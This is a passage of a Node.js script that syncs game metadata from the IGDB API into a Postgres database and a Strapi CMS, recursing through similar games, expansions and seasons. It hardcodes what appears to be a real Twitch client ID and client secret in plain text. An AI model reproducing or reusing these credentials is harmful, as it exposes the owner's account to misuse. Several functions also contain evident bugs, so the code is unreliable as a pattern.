const axios = require("axios");
const { Pool } = require("pg");
const { DateTime } = require("luxon");
const express = require("express");
const {
  handleGenres,
  handleGameModes,
  handlePlayerPerspectives,
  handleThemes,
  handleKeywords,
  handleAlternativeNames,
  handleGameEngines,
  handleLanguageSupports,
  handleInvolvedCompanies,
  handleFrenchies,
  handleExternalGames,
  handleCoverImage,
  handleBackgroundImage,
  handleScreenShots,
  handleCollections,
  handlePlatforms,
  handleVideos,
  handleWebsiteLinks,
  getRewrittenDescription,
  handleReleaseDates,
} = require("./utills");
require("dotenv").config();

const app = express();
app.use(express.json());
//prod cred:
const strapiUrl = process.env.PROD_STRAPI_URL;
const strapiToken = process.env.PROD_API_TOKEN;

//stage cred:
// const strapiUrl = process.env.STAGE_STRAPI_URL;
// const strapiToken = process.env.STAGE_API_TOKEN;

const TWITCH_AUTH_URL = "https://id.twitch.tv/oauth2/token";
const IGDB_API_URL = "https://api.igdb.com/v4/games";
const CHUNK_SIZE = 75;
const CLIENT_ID = "d0vu4uargc119cfvauchk0hw7n0qh6";
const CLIENT_SECRET = "18r7bxgrlr5n2jnqomhd5vtsnaq605";

const categoryMapping = {
  0: "main_game",
  1: "dlc_addon",
  2: "expansion",
  3: "bundle",
  4: "standalone_expansion",
  5: "mod",
  6: "episode",
  7: "season",
  8: "remake",
  9: "remaster",
  10: "expanded_game",
  11: "port",
  12: "fork",
  13: "pack",
  14: "update",
};

//production database cred
const dbClient = new Pool({
  user: process.env.DB_USER,
  host: process.env.DB_HOST,
  database: process.env.DB_DATABASE,
  password: process.env.DB_PASSWORD,
  port: process.env.DB_PORT,
  max: 10,
  idleTimeoutMillis: 30000,
});

//stage database cred
// const dbClient = new Pool({
//   user: process.env.DB_USER,
//   host: process.env.DB_HOST,
//   database: process.env.DB_DATABASE,
//   password: process.env.DB_PASSWORD,
//   port: process.env.DB_PORT,
//   max: 10,
//   idleTimeoutMillis: 30000,
// });

let accessToken = null;

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const fetchAccessToken = async () => {
  console.log("inside fetch token");
  try {
    const { data } = await axios.post(TWITCH_AUTH_URL, null, {
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      params: {
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: "client_credentials",
      },
    });
    accessToken = data.access_token;
    console.log(accessToken, "accessToken");
  } catch (error) {
    console.log(error, "error");
    throw error;
  }
};

const fetchGames = async (slug, url) => {
  const result = await dbClient.query(
    "SELECT * FROM games WHERE slug = $1 OR site_url = $2 LIMIT 1",
    [slug, url],
  );
  return result.rows;
};

const updateGame = async (gameId, updatedData) => {
  const headerFromApi = {
    "Client-ID": CLIENT_ID,
    Authorization: `Bearer ${accessToken}`,
  };
  const objData = await objectForGame(updatedData, headerFromApi);
  console.log(objData, "obJectFatat");
  await updateOrCreateGameDataWithNewFeilds(objData, gameId);
};

const createGame = async (createdData) => {
  const headerFromApi = {
    "Client-ID": CLIENT_ID,
    Authorization: `Bearer ${accessToken}`,
  };
  const objData = await objectForGame(createdData, headerFromApi);
  console.log(objData, "objFtaatattatatattatat");
  await updateOrCreateGameDataWithNewFeilds(objData);
};
function addPublishedAtIfRequired(gameData) {
  const requiredFields = [
    "title",
    "description",
    "coverImage",
    "devices",
    "releaseByPlatforms",
    "website_links",
  ];

  const allRequiredFieldsPresent = requiredFields.every(
    (field) =>
      (gameData[field] && gameData[field] !== "") ||
      (field === "coverImage" && gameData?.cover_image),
  );
  return allRequiredFieldsPresent ? DateTime.now().toISO() : null;
}

const processGames = async (games) => {
  const gamesWithSiteUrl = games.filter((game) => game.url);
  const siteUrls = gamesWithSiteUrl.map((game) => game.url);
  let updatedDataWithSiteUrl = [];

  if (siteUrls.length > 0) {
    const siteUrlQuery = `fields *,genres.name,game_modes.name,player_perspectives.name,game_engines.name,involved_companies.developer,involved_companies.publisher,involved_companies.company.name,keywords.name,platforms.name,release_dates.*,screenshots.url,themes.name,videos.video_id,videos.name,websites.type.type,websites.url,language_supports.language.name,game_localizations.*,similar_games.*,external_games.name,cover.url,artworks.url,age_ratings.*,franchises.name,collections.name,release_dates.platform.*,alternative_names.name,similar_games.genres.name,similar_games.game_modes.name,similar_games.player_perspectives.name,similar_games.game_engines.name,similar_games.involved_companies.developer,similar_games.involved_companies.publisher,similar_games.involved_companies.company.name,similar_games.keywords.name,similar_games.platforms.name,similar_games.release_dates.*,similar_games.screenshots.url,similar_games.themes.name,similar_games.videos.video_id,similar_games.videos.name,similar_games.websites.type.type,similar_games.websites.url,similar_games.language_supports.language.name,similar_games.game_localizations.*,similar_games.similar_games.*,similar_games.external_games.name,similar_games.cover.url,similar_games.artworks.url,similar_games.age_ratings.*,similar_games.franchises.name,similar_games.collections.name,similar_games.release_dates.platform.*,expansions.*,similar_games.alternative_names.name,expansions.genres.name,expansions.game_modes.name,expansions.player_perspectives.name,expansions.game_engines.name,expansions.involved_companies.developer,expansions.involved_companies.publisher,expansions.involved_companies.company.name,expansions.keywords.name,expansions.platforms.name,expansions.release_dates.*,expansions.screenshots.url,expansions.themes.name,expansions.videos.video_id,expansions.videos.name,expansions.websites.type.type,expansions.websites.url,expansions.language_supports.language.name,expansions.game_localizations.*,expansions.similar_games.*,expansions.external_games.name,expansions.cover.url,expansions.artworks.url,expansions.age_ratings.*,expansions.franchises.name,expansions.collections.name,expansions.release_dates.platform.*,expansions.expansions.*,expansions.alternative_names.name; url; where url = (${siteUrls
      .map((url) => `"${url}"`)
      .join(",")}); limit ${siteUrls.length};`;

    updatedDataWithSiteUrl = await fetchFromIGDB(siteUrlQuery);
    console.log(updatedDataWithSiteUrl, "llllllllll");
  }
  for (let i = 0; i < games.length; i++) {
    const game = games[i];
    console.log(game, "gamemememem12345");
    let updatedData;
    const gamesExistsInDb = await fetchGames(game.slug, game.url);
    console.log(gamesExistsInDb, "gameExistingindb");
    if (
      gamesExistsInDb &&
      gamesExistsInDb.length > 0 &&
      gamesExistsInDb[0]?.site_url
    ) {
      updatedData = updatedDataWithSiteUrl.find(
        (data) => data.url === gamesExistsInDb[0]?.site_url,
      );
      if (updatedData) {
        await updateGame(gamesExistsInDb[0]?.id, updatedData);
      }
    } else {
      console.log("inside else!!", updatedDataWithSiteUrl);

      // Correctly get the data from updatedDataWithSiteUrl using game.url
      updatedData = updatedDataWithSiteUrl.find(
        (data) => data.url === game.url,
      );
      console.log(updatedData, "llllllllppppppppppp", game);
      if (updatedData) {
        await createGame(updatedData);
      }
    }
  }
};
const fetchFromIGDB = async (query) => {
  try {
    const response = await fetch("https://api.igdb.com/v4/games", {
      method: "POST",
      headers: {
        "Client-ID": CLIENT_ID,
        Authorization: `Bearer ${accessToken}`,
      },
      body: query,
    });
    const data = await response.json();
    return data; // Return the result of the IGDB API call
  } catch (error) {
    console.log(error, "error");
    throw error;
  }
};

const startProcess = async (gamesArr) => {
  let client;
  try {
    client = await dbClient.connect();
    await fetchAccessToken();
    if (accessToken) {
      const normalizedArr = Array.isArray(gamesArr) ? gamesArr : [gamesArr];
      if (normalizedArr.length > 0) {
        await processGames(normalizedArr);
      }
    } else {
      console.log("Access token not available");
    }
  } catch (err) {
    console.error("Error connecting to the database:", err);
    console.log(err, "error in startProcess");
  } finally {
    console.log("3");
    if (client) {
      client.release();
    }
  }
};

const checkIfGameExists = async (slug) => {
  try {
    const strapiApiUrl = `${strapiUrl}/api/games/${slug}`;
    const response = await axios.get(strapiApiUrl);
    return response.data;
  } catch (error) {
    console.error(`Error checking for game with slug "${slug}":`, error);
    return null;
  }
};

const createGameEntryInStrapi = async (gameData) => {
  try {
    const strapiApiUrl = `${strapiUrl}/api/games`;
    const response = await axios.post(strapiApiUrl, { data: gameData });
    console.log("Game entry created successfully:");
    return response.data;
  } catch (error) {
    console.error(
      "Error creating game entry:",
      error.response ? error.response.data : error,
    );
  }
};

const handleSimilarGames = async (
  parsedData,
  headerFromApi,
  processedGames = new Set(),
) => {
  if (!parsedData.similar_games) return [];

  const categoryMapping = {
    0: "main_game",
    1: "dlc_addon",
    2: "expansion",
    3: "bundle",
    4: "standalone_expansion",
    5: "mod",
    6: "episode",
    7: "season",
    8: "remake",
    9: "remaster",
    10: "expanded_game",
    11: "port",
    12: "fork",
    13: "pack",
    14: "update",
  };

  let similarGamesArray = [];

  // Normalize string-based similar_games
  if (typeof parsedData.similar_games === "string") {
    parsedData.similar_games = parsedData.similar_games
      .replace(/{|}/g, "")
      .split(",")
      .map((id) => parseInt(id.trim(), 10))
      .filter(Boolean);
  }

  const uniqueGameIds = parsedData.similar_games.filter(
    (id) => !processedGames.has(id),
  );

  if (uniqueGameIds.length === 0) return [];

  try {
    const gameIdsString = uniqueGameIds.join(",");
    const query = `fields *,genres.name,game_modes.name,player_perspectives.name,game_engines.name,involved_companies.developer,involved_companies.publisher,involved_companies.company.name,keywords.name,platforms.name,release_dates.*,screenshots.url,themes.name,videos.video_id,videos.name,websites.type.type,websites.url,language_supports.language.name,game_localizations.*,similar_games.*,external_games.name,cover.url,artworks.url,age_ratings.*,franchises.name,collections.name,release_dates.platform.*,alternative_names.name,similar_games.genres.name,similar_games.game_modes.name,similar_games.player_perspectives.name,similar_games.game_engines.name,similar_games.involved_companies.developer,similar_games.involved_companies.publisher,similar_games.involved_companies.company.name,similar_games.keywords.name,similar_games.platforms.name,similar_games.release_dates.*,similar_games.screenshots.url,similar_games.themes.name,similar_games.videos.video_id,similar_games.videos.name,similar_games.websites.type.type,similar_games.websites.url,similar_games.language_supports.language.name,similar_games.game_localizations.*,similar_games.similar_games.*,similar_games.external_games.name,similar_games.cover.url,similar_games.artworks.url,similar_games.age_ratings.*,similar_games.franchises.name,similar_games.collections.name,similar_games.release_dates.platform.*,expansions.*,similar_games.alternative_names.name,expansions.genres.name,expansions.game_modes.name,expansions.player_perspectives.name,expansions.game_engines.name,expansions.involved_companies.developer,expansions.involved_companies.publisher,expansions.involved_companies.company.name,expansions.keywords.name,expansions.platforms.name,expansions.release_dates.*,expansions.screenshots.url,expansions.themes.name,expansions.videos.video_id,expansions.videos.name,expansions.websites.type.type,expansions.websites.url,expansions.language_supports.language.name,expansions.game_localizations.*,expansions.similar_games.*,expansions.external_games.name,expansions.cover.url,expansions.artworks.url,expansions.age_ratings.*,expansions.franchises.name,expansions.collections.name,expansions.release_dates.platform.*,expansions.expansions.*,expansions.alternative_names.name; where id = (${gameIdsString});`;

    const similarGamesResponse = await fetchWithRetry(
      "https://api.igdb.com/v4/games",
      query,
      headerFromApi,
    );

    for (const similarGame of similarGamesResponse.data) {
      const gameId = similarGame.id;

      // Prevent processing already visited games
      if (processedGames.has(gameId)) continue;
      processedGames.add(gameId);

      const existingGame = await checkIfGameExists(similarGame.slug);
      if (existingGame) {
        similarGamesArray.push(existingGame.id);
        continue;
      }

      // const categoryId = similarGame.category;
      const categoryId = similarGame?.game_type;
      const categoryName = categoryMapping[categoryId];

      const [
        gameGenres,
        gameModes,
        gamePlayerPerspectives,
        gameThemes,
        gameKeywords,
        gameAlternativeNames,
        gameEngines,
        gameLanguageSupports,
        gameInvolvedCompanies,
        gameFranchies,
        externalGames,
        gameCoverImage,
        gameBackgroundImage,
        gameScreenShots,
        gameCollections,
        gamePlatforms,
        gameVideos,
        gameWebsiteLinks,
        promtGeneratedDescription,
        gameReleaseDates,
        gameSeriesOrSpinOff,
      ] = await Promise.all([
        handleGenres(similarGame),
        handleGameModes(similarGame),
        handlePlayerPerspectives(similarGame),
        handleThemes(similarGame),
        handleKeywords(similarGame),
        handleAlternativeNames(similarGame),
        handleGameEngines(similarGame),
        handleLanguageSupports(similarGame),
        handleInvolvedCompanies(similarGame),
        handleFrenchies(similarGame),
        handleExternalGames(similarGame),
        handleCoverImage(similarGame),
        handleBackgroundImage(similarGame),
        handleScreenShots(similarGame),
        handleCollections(similarGame),
        handlePlatforms(similarGame),
        handleVideos(similarGame),
        handleWebsiteLinks(similarGame),
        getRewrittenDescription(similarGame?.name, similarGame?.summary),
        handleReleaseDates(similarGame, headerFromApi),
        handleSeriesAndSpinOff(similarGame, headerFromApi),
      ]);

      const relatedGames = await handleSimilarGames(
        { similar_games: similarGame.similar_games || [] },
        headerFromApi,
        processedGames,
      );

      const newGame = {
        title: similarGame.name || null,
        slug: similarGame.slug || null,
        site_url: similarGame.url,
        genres: gameGenres || [],
        game_modes: gameModes || [],
        player_perspective: gamePlayerPerspectives || [],
        themes: gameThemes || [],
        keywords: gameKeywords || [],
        alternative_names: gameAlternativeNames || [],
        game_engines: gameEngines || [],
        language_supports: gameLanguageSupports || [],
        involved_companies: gameInvolvedCompanies?.involvedCompaniesArray || [],
        publisher: gameInvolvedCompanies?.publishersArray || [],
        developer: gameInvolvedCompanies?.developersArray || [],
        franchises: gameFranchies || [],
        external_games: externalGames || [],
        coverImage: gameCoverImage || null,
        image: gameBackgroundImage || null,
        ...(gameScreenShots?.length > 0 && {
          screenshots: gameScreenShots,
        }),
        collections: gameCollections || [],
        platforms: gamePlatforms || [],
        videos: gameVideos || [],
        website_links: gameWebsiteLinks || [],
        description: promtGeneratedDescription || null,
        releaseByPlatforms: {
          release: gameReleaseDates?.releaseByPlatformsArray || [],
        },
        devices: gameReleaseDates?.devicesArray || [],
        firstReleaseDate: gameReleaseDates?.earliestReleaseDate || null,
        latestReleaseDate: gameReleaseDates?.latestReleaseDate || null,
        aggregateRating: similarGame.aggregated_rating || null,
        series: gameSeriesOrSpinOff?.seriesName || null,
        isSpinOff: gameSeriesOrSpinOff?.isSpinOffName || null,
        related_games: relatedGames || [],
        publishedAt: addPublishedAtIfRequired(similarGame),
        isUpdatedFromScript: true,
      };

      const createdGame = await createGameEntryInStrapi(newGame);
      similarGamesArray.push(createdGame.data.id);
    }

    console.log(similarGamesArray, "similarGamesArray");
    return similarGamesArray;
  } catch (error) {
    console.error(`Failed to handle similar games: ${error.message}`);
    return [];
  }
};

const updateGameEntryInStrapi = async (gameId, updateData) => {
  try {
    const response = await axios.put(
      `${strapiUrl}/api/games/${gameId}`,
      updateData,
    );
    console.log("Game updated successfully:");
    return response.data;
  } catch (error) {
    console.error(
      "Error updating game entry:",
      error.response ? error.response.data : error,
    );
  }
};

const handleGameExpansions = async (
  parsedData,
  headerFromApi,
  processedGames = [],
) => {
  if (parsedData.expansions) {
    const categoryMapping = {
      0: "main_game",
      1: "dlc_addon",
      2: "expansion",
      3: "bundle",
      4: "standalone_expansion",
      5: "mod",
      6: "episode",
      7: "season",
      8: "remake",
      9: "remaster",
      10: "expanded_game",
      11: "port",
      12: "fork",
      13: "pack",
      14: "update",
    };
    let expansionGamesArray = [];

    if (typeof parsedData.expansions === "string") {
      parsedData.expansions = parsedData.expansions
        .replace(/{|}/g, "")
        .split(",")
        .map((id) => id.trim());
    }
    if (parsedData.expansions && parsedData.expansions.length > 0) {
      try {
        const gameIds = parsedData.expansions.map((game) => game.id).join(",");
        const query = `fields *,genres.name,game_modes.name,player_perspectives.name,game_engines.name,involved_companies.developer,involved_companies.publisher,involved_companies.company.name,keywords.name,platforms.name,release_dates.*,screenshots.url,themes.name,videos.video_id,videos.name,websites.type.type,websites.url,language_supports.language.name,game_localizations.*,similar_games.*,external_games.name,cover.url,artworks.url,age_ratings.*,franchises.name,collections.name,release_dates.platform.*,alternative_names.name,similar_games.genres.name,similar_games.game_modes.name,similar_games.player_perspectives.name,similar_games.game_engines.name,similar_games.involved_companies.developer,similar_games.involved_companies.publisher,similar_games.involved_companies.company.name,similar_games.keywords.name,similar_games.platforms.name,similar_games.release_dates.*,similar_games.screenshots.url,similar_games.themes.name,similar_games.videos.video_id,similar_games.videos.name,similar_games.websites.type.type,similar_games.websites.url,similar_games.language_supports.language.name,similar_games.game_localizations.*,similar_games.similar_games.*,similar_games.external_games.name,similar_games.cover.url,similar_games.artworks.url,similar_games.age_ratings.*,similar_games.franchises.name,similar_games.collections.name,similar_games.release_dates.platform.*,expansions.*,similar_games.alternative_names.name,expansions.genres.name,expansions.game_modes.name,expansions.player_perspectives.name,expansions.game_engines.name,expansions.involved_companies.developer,expansions.involved_companies.publisher,expansions.involved_companies.company.name,expansions.keywords.name,expansions.platforms.name,expansions.release_dates.*,expansions.screenshots.url,expansions.themes.name,expansions.videos.video_id,expansions.videos.name,expansions.websites.type.type,expansions.websites.url,expansions.language_supports.language.name,expansions.game_localizations.*,expansions.similar_games.*,expansions.external_games.name,expansions.cover.url,expansions.artworks.url,expansions.age_ratings.*,expansions.franchises.name,expansions.collections.name,expansions.release_dates.platform.*,expansions.expansions.*,expansions.alternative_names.name; where id = (${gameIds});`;
        const expansionGamesResponse = await fetchWithRetry(
          "https://api.igdb.com/v4/games",
          query,
          headerFromApi,
        );
        // Process each expansion game
        for (const expansionGame of expansionGamesResponse.data) {
          // Check if the game already exists in Strapi

          const existingGame = await checkIfGameExists(expansionGame.slug);
          let gameId;
          if (existingGame) {
            // If the game exists, use its ID
            gameId = existingGame.id;
            const newGame = {
              data: {
                isExpansion: "true",
              },
            };
            await updateGameEntryInStrapi(gameId, newGame);

            expansionGamesArray.push(...expansionGamesArray, gameId);
            // expansionGamesArray.push(gameId);
          } else {
            // const categoryId = expansionGame.category;
            const categoryId = expansionGame?.game_type;
            const categoryName = categoryMapping[categoryId];
            const gameGenres = await handleGenres(expansionGame);
            const gameModes = await handleGameModes(expansionGame);
            const gamePlayerPerspectives =
              await handlePlayerPerspectives(expansionGame);
            const gameThemes = await handleThemes(expansionGame);
            const gameKeywords = await handleKeywords(expansionGame);
            const gameAlternativeNames =
              await handleAlternativeNames(expansionGame);
            const gameEngines = await handleGameEngines(expansionGame);
            const gameLanguageSupports =
              await handleLanguageSupports(expansionGame);
            const gameInvolvedCompanies =
              await handleInvolvedCompanies(expansionGame);
            const gameFranchies = await handleFrenchies(expansionGame);
            const externalGames = await handleExternalGames(expansionGame);
            const gameCoverImage = await handleCoverImage(expansionGame);
            const gameBackgroundImage =
              await handleBackgroundImage(expansionGame);
            const gameScreenShots = await handleScreenShots(expansionGame);
            const gameCollections = await handleCollections(expansionGame);
            const gamePlatforms = await handlePlatforms(expansionGame);
            const gameVideos = await handleVideos(expansionGame);
            const gameWebsiteLinks = await handleWebsiteLinks(expansionGame);
            const promtGeneratedDescription = await getRewrittenDescription(
              expansionGame?.name,
              expansionGame?.summary,
            );
            const gameReleaseDates = await handleReleaseDates(
              expansionGame,
              headerFromApi,
            );
            const gameSeriesOrSpinOff = await handleSeriesAndSpinOff(
              expansionGame,
              headerFromApi,
            );
            const similarGames = await handleSimilarGames(
              expansionGame,
              headerFromApi,
            );
            const expansionGames = await handleGameExpansions(
              { expansion_games: expansionGames.expansions || [] },
              headerFromApi,
              [...processedGames, expansionGame.id],
            );
            //Add data in strapi
            const newGame = {
              title: parsedData.name || null,
              slug: parsedData.slug || null,
              site_url: parsedData.url,
              genres: gameGenres || [],
              game_modes: gameModes || [],
              player_perspective: gamePlayerPerspectives || [],
              themes: gameThemes || [],
              keywords: gameKeywords || [],
              alternative_names: gameAlternativeNames || [],
              game_engines: gameEngines || [],
              language_supports: gameLanguageSupports || [],
              involved_companies:
                (gameInvolvedCompanies &&
                  gameInvolvedCompanies?.involvedCompaniesArray) ||
                [],
              publisher:
                (gameInvolvedCompanies &&
                  gameInvolvedCompanies?.publishersArray) ||
                [],
              developer:
                gameInvolvedCompanies &&
                gameInvolvedCompanies?.developersArray &&
                gameInvolvedCompanies?.developersArray.length > 0
                  ? gameInvolvedCompanies?.developersArray
                  : [],
              franchises: gameFranchies || [],
              external_games: externalGames || [],
              coverImage: gameCoverImage || null,
              image: gameBackgroundImage || null,
              ...(gameScreenShots &&
                gameScreenShots.length > 0 && {
                  screenshots: gameScreenShots,
                }),
              collections: gameCollections || [],
              platforms: gamePlatforms || [],
              videos: gameVideos || [],
              website_links: gameWebsiteLinks || [],
              description: promtGeneratedDescription || null,
              releaseByPlatforms: {
                release:
                  gameReleaseDates?.releaseByPlatformsArray &&
                  gameReleaseDates?.releaseByPlatformsArray.length > 0
                    ? gameReleaseDates?.releaseByPlatformsArray
                    : [],
              },
              devices: gameReleaseDates?.devicesArray || [],
              firstReleaseDate: gameReleaseDates?.earliestReleaseDate || null,
              latestReleaseDate: gameReleaseDates?.latestReleaseDate || null,
              // game_category: categoryName || null,
              aggregateRating: parsedData.aggregated_rating || null,
              series: gameSeriesOrSpinOff?.seriesName || null,
              isSpinOff: gameSeriesOrSpinOff?.isSpinOffName || null,
              related_games: similarGames || [],
              expansions: expansionGames || [],
              publishedAt: addPublishedAtIfRequired(parsedData),
              isUpdatedFromScript: true,
              isExpansion: "true",
            };
            const createdGame = await createGameEntryInStrapi(newGame);
            gameId = createdGame.data.id;
            const newGameObj = {
              data: {
                isExpansion: "true",
              },
            };
            await updateGameEntryInStrapi(gameId, newGameObj);

            expansionGamesArray.push(...expansionGamesArray, gameId);

            // expansionGamesArray.push(gameId);
          }
        }
        // Return the array of expansion game IDs
        return expansionGamesArray;
      } catch (error) {
        console.error(`Failed to handle expansion games: ${error.message}`);
        return [];
      }
    }
  }
  return [];
};
// Function to get or create a season
const getOrCreateSeason = async (game, headerFromApi) => {
  const categoryMapping = {
    0: "main_game",
    1: "dlc_addon",
    2: "expansion",
    3: "bundle",
    4: "standalone_expansion",
    5: "mod",
    6: "episode",
    7: "season",
    8: "remake",
    9: "remaster",
    10: "expanded_game",
    11: "port",
    12: "fork",
    13: "pack",
    14: "update",
  };
  let seasonGame;
  try {
    if (game.category === 7) {
      // Check if the parent game exists
      const parentGame = game.parent_game
        ? await findOrCreateParentGame(game.parent_game, headerFromApi)
        : null;
      // const categoryId = game.category;
      const categoryId = game?.game_type;
      const categoryName = categoryMapping[categoryId];
      const gameGenres = await handleGenres(game);
      const gameModes = await handleGameModes(game);
      const gamePlayerPerspectives = await handlePlayerPerspectives(game);
      const gameThemes = await handleThemes(game);
      const gameKeywords = await handleKeywords(game);
      const gameAlternativeNames = await handleAlternativeNames(game);
      const gameEngines = await handleGameEngines(game);
      const gameLanguageSupports = await handleLanguageSupports(game);
      const gameInvolvedCompanies = await handleInvolvedCompanies(game);
      const gameFranchies = await handleFrenchies(game);
      const externalGames = await handleExternalGames(game);
      const gameCoverImage = await handleCoverImage(game);
      const gameBackgroundImage = await handleBackgroundImage(game);
      const gameScreenShots = await handleScreenShots(game);
      const gameCollections = await handleCollections(game);
      const gamePlatforms = await handlePlatforms(game);
      const gameVideos = await handleVideos(game);
      const gameWebsiteLinks = await handleWebsiteLinks(game);
      const promtGeneratedDescription = await getRewrittenDescription(
        game?.name,
        game?.summary,
      );
      const gameReleaseDates = await handleReleaseDates(game, headerFromApi);
      const gameSeriesOrSpinOff = await handleSeriesAndSpinOff(
        game,
        headerFromApi,
      );
      const expansionGames = await handleGameExpansions(game, headerFromApi);
      const similarGames = await handleSimilarGames(game, headerFromApi);
      //Add data in strapi
      const gameData = {
        title: game.name || null,
        slug: game.slug || null,
        site_url: game.url,
        genres: gameGenres || [],
        game_modes: gameModes || [],
        player_perspective: gamePlayerPerspectives || [],
        themes: gameThemes || [],
        keywords: gameKeywords || [],
        alternative_names: gameAlternativeNames || [],
        game_engines: gameEngines || [],
        language_supports: gameLanguageSupports || [],
        involved_companies:
          (gameInvolvedCompanies &&
            gameInvolvedCompanies?.involvedCompaniesArray) ||
          [],
        publisher:
          (gameInvolvedCompanies && gameInvolvedCompanies?.publishersArray) ||
          [],
        developer:
          gameInvolvedCompanies &&
          gameInvolvedCompanies?.developersArray &&
          gameInvolvedCompanies?.developersArray.length > 0
            ? gameInvolvedCompanies?.developersArray
            : [],
        franchises: gameFranchies || [],
        external_games: externalGames || [],
        coverImage: gameCoverImage || null,
        image: gameBackgroundImage || null,
        ...(gameScreenShots &&
          gameScreenShots.length > 0 && {
            screenshots: gameScreenShots,
          }),
        collections: gameCollections || [],
        platforms: gamePlatforms || [],
        videos: gameVideos || [],
        website_links: gameWebsiteLinks || [],
        description: promtGeneratedDescription || null,
        releaseByPlatforms: {
          release:
            gameReleaseDates?.releaseByPlatformsArray &&
            gameReleaseDates?.releaseByPlatformsArray.length > 0
              ? gameReleaseDates?.releaseByPlatformsArray
              : [],
        },
        devices: gameReleaseDates?.devicesArray || [],
        firstReleaseDate: gameReleaseDates?.earliestReleaseDate || null,
        latestReleaseDate: gameReleaseDates?.latestReleaseDate || null,
        // game_category: categoryName || null,
        aggregateRating: game.aggregated_rating || null,
        series: gameSeriesOrSpinOff?.seriesName || null,
        isSpinOff: gameSeriesOrSpinOff?.isSpinOffName || null,
        related_games: similarGames || [],
        expansions: expansionGames || [],
        publishedAt: addPublishedAtIfRequired(game),
        isUpdatedFromScript: true,
        isSeason: "true",
      };
      const existingSeason = await checkIfGameExists(game.slug);
      if (existingSeason && existingSeason) {
        seasonGame = existingSeason;
      } else {
        seasonGame = await createGameEntryInStrapi(gameData);
      }
      console.log(seasonGame.id, "seasonGamemememem", parentGame.id);
      // Update parent game with the season ID
      if (parentGame && seasonGame) {
        await updateParentGameWithSeasonId(
          parentGame && parentGame.id
            ? parentGame.id
            : parentGame.data && parentGame.data.id,
          seasonGame && seasonGame.id
            ? seasonGame.id
            : seasonGame.data && seasonGame.data.id,
          parentGame,
        );
      }
      console.log(seasonGame, "seasonFgggggggggggggggggggggggggggg");
      return seasonGame && seasonGame.id
        ? seasonGame.id
        : seasonGame.data && seasonGame.data.id
          ? seasonGame.data.id
          : null;
    } else {
      console.log(`Skipping game: ${game.name} as it's not a season.`);
      return null;
    }
  } catch (error) {
    console.error(`Failed to process game "${game.name}": ${error.message}`);
    return null;
  }
};

// Helper function to find or create the parent game
const findOrCreateParentGame = async (parentGameId, headerFromApi) => {
  const categoryMapping = {
    0: "main_game",
    1: "dlc_addon",
    2: "expansion",
    3: "bundle",
    4: "standalone_expansion",
    5: "mod",
    6: "episode",
    7: "season",
    8: "remake",
    9: "remaster",
    10: "expanded_game",
    11: "port",
    12: "fork",
    13: "pack",
    14: "update",
  };
  try {
    const parentGame = await getParentGameById(parentGameId, headerFromApi);
    if (!parentGame) {
      console.error(`Parent game with ID: ${parentGameId} not found.`);
      return null;
    }
    const existingParentGame = await checkIfGameExists(parentGame.slug);
    if (existingParentGame && existingParentGame) {
      return existingParentGame;
    } else {
      try {
        // const categoryId = parentGame.category;
        const categoryId = parentGame?.game_type;
        const categoryName = categoryMapping[categoryId];
        const gameGenres = await handleGenres(parentGame);
        const gameModes = await handleGameModes(parentGame);
        const gamePlayerPerspectives =
          await handlePlayerPerspectives(parentGame);
        const gameThemes = await handleThemes(parentGame);
        const gameKeywords = await handleKeywords(parentGame);
        const gameAlternativeNames = await handleAlternativeNames(parentGame);
        const gameEngines = await handleGameEngines(parentGame);
        const gameLanguageSupports = await handleLanguageSupports(parentGame);
        const gameInvolvedCompanies = await handleInvolvedCompanies(parentGame);
        const gameFranchies = await handleFrenchies(parentGame);
        const externalGames = await handleExternalGames(parentGame);
        const gameCoverImage = await handleCoverImage(parentGame);
        const gameBackgroundImage = await handleBackgroundImage(parentGame);
        const gameScreenShots = await handleScreenShots(parentGame);
        const gameCollections = await handleCollections(parentGame);
        const gamePlatforms = await handlePlatforms(parentGame);
        const gameVideos = await handleVideos(parentGame);
        const gameWebsiteLinks = await handleWebsiteLinks(parentGame);
        const promtGeneratedDescription = await getRewrittenDescription(
          parentGame?.name,
          parentGame?.summary,
        );
        const gameReleaseDates = await handleReleaseDates(
          parentGame,
          headerFromApi,
        );
        const gameSeriesOrSpinOff = await handleSeriesAndSpinOff(
          parentGame,
          headerFromApi,
        );
        const similarGames = await handleSimilarGames(
          parentGame,
          headerFromApi,
        );
        const expansionGames = await handleGameExpansions(
          parentGame,
          headerFromApi,
        );
        const sessionGames = await getOrCreateSeason(parentGame, headerFromApi);
        //Add data in strapi
        const gameData = {
          title: parentGame.name || null,
          slug: parentGame.slug || null,
          site_url: parentGame.url,
          genres: gameGenres || [],
          game_modes: gameModes || [],
          player_perspective: gamePlayerPerspectives || [],
          themes: gameThemes || [],
          keywords: gameKeywords || [],
          alternative_names: gameAlternativeNames || [],
          game_engines: gameEngines || [],
          language_supports: gameLanguageSupports || [],
          involved_companies:
            (gameInvolvedCompanies &&
              gameInvolvedCompanies?.involvedCompaniesArray) ||
            [],
          publisher:
            (gameInvolvedCompanies && gameInvolvedCompanies?.publishersArray) ||
            [],
          developer:
            gameInvolvedCompanies &&
            gameInvolvedCompanies?.developersArray &&
            gameInvolvedCompanies?.developersArray.length > 0
              ? gameInvolvedCompanies?.developersArray
              : [],
          franchises: gameFranchies || [],
          external_games: externalGames || [],
          coverImage: gameCoverImage || null,
          image: gameBackgroundImage || null,
          ...(gameScreenShots &&
            gameScreenShots.length > 0 && {
              screenshots: gameScreenShots,
            }),
          collections: gameCollections || [],
          platforms: gamePlatforms || [],
          videos: gameVideos || [],
          website_links: gameWebsiteLinks || [],
          description: promtGeneratedDescription || null,
          releaseByPlatforms: {
            release:
              gameReleaseDates?.releaseByPlatformsArray &&
              gameReleaseDates?.releaseByPlatformsArray.length > 0
                ? gameReleaseDates?.releaseByPlatformsArray
                : [],
          },
          devices: gameReleaseDates?.devicesArray || [],
          firstReleaseDate: gameReleaseDates?.earliestReleaseDate || null,
          latestReleaseDate: gameReleaseDates?.latestReleaseDate || null,
          // game_category: categoryName || null,
          aggregateRating: parentGame.aggregated_rating || null,
          series: gameSeriesOrSpinOff?.seriesName || null,
          isSpinOff: gameSeriesOrSpinOff?.isSpinOffName || null,
          related_games: similarGames || [],
          expansions: expansionGames || [],
          isSeason: sessionGames ? "true" : null,
          publishedAt: addPublishedAtIfRequired(parentGame),
          isUpdatedFromScript: true,
        };
        // Create the parent game in Strapi
        const response = await createGameEntryInStrapi(gameData);
        return response;
      } catch (error) {
